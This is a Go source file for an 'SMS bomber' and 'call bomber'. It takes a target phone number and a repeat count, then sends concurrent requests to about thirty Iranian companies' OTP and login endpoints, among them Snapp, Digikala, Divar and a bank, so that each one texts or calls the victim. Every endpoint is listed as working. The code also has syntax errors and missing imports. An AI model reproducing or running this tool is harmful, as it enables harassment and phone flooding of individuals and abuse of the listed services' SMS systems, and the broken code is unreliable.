package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)


func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sms(url string, payload map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(3 * time.Second)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData)) // تغییر به application/json
	time.Sleep(3 * time.Second)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color

	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
		formData := url.Values{}
		formData.Set("cellphone", phone)
		requestBody := strings.NewReader(formData.Encode())
		go func() {
			resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
			if err != nil {
				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
				ch <- http.StatusInternalServerError
				return
			}
			defer resp.Body.Close()
			ch <- resp.StatusCode
		}()     //active✅
		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, ch)  //active✅
		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
			"mobile": phone,
		}, ch)  //active✅
		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			s15: phone,
		}, ch)  //active✅
		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
			"mobile": phone,
		}, ch)  //active✅
		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, ch)  //active✅
		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, ch)  //active✅
		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, ch)  //active✅
		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, ch)  //active✅
		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, ch)  //active✅
		go sms("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  //active✅
		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"username": phone,
		}, ch)  //active✅
		go sms("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, ch)  //active✅
		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, ch) // active✅
		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, ch  // active✅
		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0", map[string]interface{}{
		 	"cellphone": phone,
                }, ch) // active✅
		go sms("https://api.nobat.ir/patient/login/phone", map[string]interface{}{
			"mobile": phone,
		}, ch) // active✅
		go sms("https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
			"username": phone,
		}, ch) // active✅
		go sms("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, ch) // active✅
		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, ch) // active✅
		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, ch) //active ✅
		go sms("https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, ch) //active ✅
		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
			"mobileNumber": phone,
		}, ch) //active ✅
		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
			"mobile": phone,
		}, ch) //active ✅
		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
			"phone": phone,
		}, ch) //active ✅
		go sms("https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			"PhoneNo": phone,
		}, ch) //active ✅
		go sms("https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, ch) //active ✅
		s5 := fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone)
		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
			s5: phone,
		}, ch) //active ✅
		go sms("https://tap33.me/api/v2/user", map[string]interface{}{
			"phoneNumber": phone,
		}, ch) //active ✅
		go sms("https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
			"mobile": phone,
		}, ch) //active ✅

	for i := 0; i < repeatCount; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
